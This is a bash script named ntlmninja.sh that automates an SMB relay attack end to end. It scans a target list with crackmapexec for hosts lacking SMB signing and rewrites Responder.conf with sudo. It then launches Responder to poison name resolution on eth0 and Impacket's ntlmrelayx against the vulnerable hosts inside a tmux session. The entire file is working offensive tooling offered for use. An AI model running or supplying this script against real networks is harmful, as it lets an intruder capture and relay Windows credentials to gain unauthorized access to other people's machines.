#!/bin/bash

# =============================================================
# ntlmninja.sh - SMB Relay Attack Automation Script
# -------------------------------------------------------------
# This script automates the setup and execution of an SMB relay
# attack using tools like Responder, Impacket's ntlmrelayx,
# crackmapexec, and tmux. It scans a list of target IPs for
# misconfigured SMB signing, and if vulnerabilities are found,
# it initiates a relay attack within a tmux session.
#
# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
# =============================================================

responder_config_file="/etc/responder/Responder.conf"
session_name="smb_relay_attack"
window1="responder"
window2="ntlmrelayx"
TARGET_SMB_FILE="vulnerable_smb_targets.txt" 

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Print help
print_help() {
    echo -e "${BLUE}Usage: $0 [-f TARGET_FILE] [-h]${NC}"
    echo -e "  ${YELLOW}-f TARGET_FILE${NC}   The file containing all targets to scan for misconfigured smb signing."
    echo -e "  ${YELLOW}-h${NC}               Display this help and exit"
}

# Check if a tool is installed
check_tool() {
    echo -e "[*] Checking ${YELLOW}$1${NC} if installed..."
    if ! which $1 >/dev/null; then
        echo -e "${RED}[!] $1 is not installed. Please install it and try again.${NC}"
        exit 1
    fi
}

# Run crackmapexec
run_crackmapexec() {
    # Check if the target list for SMB Relay already exists
    if [[ ! -f "${TARGET_SMB_FILE}" ]]; then
        echo -e "[*] ${BLUE}Commence checking on targets with misconfigured smb signing${NC}"
        echo -e "[*] ${GREEN}Generating list of misconfigured smb signing targets in this output file ${TARGET_SMB_FILE}${NC} via crackmapexec..."
        crackmapexec smb --gen-relay-list "${TARGET_SMB_FILE}" "${TARGET_FILE}" | grep "signing:False"
    fi
}

# Edit Responder.conf file
edit_responder_conf() {
    if [ -f "${responder_config_file}" ]; then
        if grep -qE '^SMB = Off$' "${responder_config_file}" && grep -qE '^HTTP = Off$' "${responder_config_file}"; then
            echo -e "[*] ${GREEN}Responder.conf already has SMB and HTTP settings set to 'Off'.${NC}"
            return
        else
            echo -e "[*] ${YELLOW}Turning off SMB and HTTP on Responder.conf...${NC}"
            sudo sed -i 's/^SMB = .*/SMB = /' "${responder_config_file}"
            sudo sed -i "/^SMB =/ s/$/Off/" "${responder_config_file}"
            sudo sed -i 's/^HTTP = .*/HTTP = /' "${responder_config_file}"
            sudo sed -i "/^HTTP =/ s/$/Off/" "${responder_config_file}"
            echo -e "[+] ${GREEN}Turned off SMB and HTTP successfully.${NC}"
        fi
    else
        echo -e "${RED}[!] Responder.conf file not found. Please make sure Responder is installed and configured properly.${NC}"
        exit 1
    fi
}

# Run SMB Relay Attack
run_smb_relay_attack() {
    echo -e "[*] ${BLUE}Starting SMB Relay Attack...${NC}"
    # create tmux session
    echo -e "[+] ${GREEN}Creating session named ${session_name}...${NC}"
    tmux new-session -d -s $session_name
    # add responder window
    echo -e "[+] ${GREEN}Creating window named ${window1}...${NC}"
    tmux rename-window $window1
    echo -e "[*] ${YELLOW}Running responder on window ${window1}...${NC}"
    # run the responder
    tmux send-keys "responder -I eth0" C-m
    # add ntlmrelayx window
    echo -e "[+] ${GREEN}Creating window named ${window2}...${NC}"
    tmux new-window
    tmux rename-window $window2
    # run the ntlmrelayx
    echo -e "[*] ${YELLOW}Running Impacket's ntlmrelayx on window ${window2}...${NC}"
    tmux send-keys "impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE}" C-m
    # attach tmux session
    tmux -CC attach-session -t $session_name
}

while getopts "f:h" opt; do
    case $opt in
    f)
        TARGET_FILE="$OPTARG"
        ;;
    h)
        print_help
        exit 0
        ;;
    \?)
        echo -e "${RED}[!] Invalid option: -$OPTARG${NC}" >&2
        exit 1
        ;;
    :)
        echo -e "${RED}[!] Option -$OPTARG requires an argument.${NC}" >&2
        exit 1
        ;;
    esac
done

# Start SMB Relay Attack
if  tmux list-session | grep -qE "^$session_name:" > /dev/null; then
    echo -e "${RED}[!] Session name ${session_name} already exists.${NC}"
    # attach tmux session
    tmux -CC attach-session -t $session_name
else
    # Check required arguments
    if [ -z "${TARGET_FILE}" ]; then
        echo -e "${RED}[!] Usage: ./$0 [-f TARGET_FILE]${NC}"
        exit 1
    fi
    # Check if required tools are installed
    check_tool "tmux"
    check_tool "responder"
    check_tool "impacket-ntlmrelayx"
    check_tool "crackmapexec"
    run_crackmapexec
    if [ -s "${TARGET_SMB_FILE}" ]; then
        edit_responder_conf
        sleep 2
        run_smb_relay_attack
    else
        echo -e "${RED}[!] There are no misconfigured smb signing targets found. Exiting...${NC}"
    fi
fi
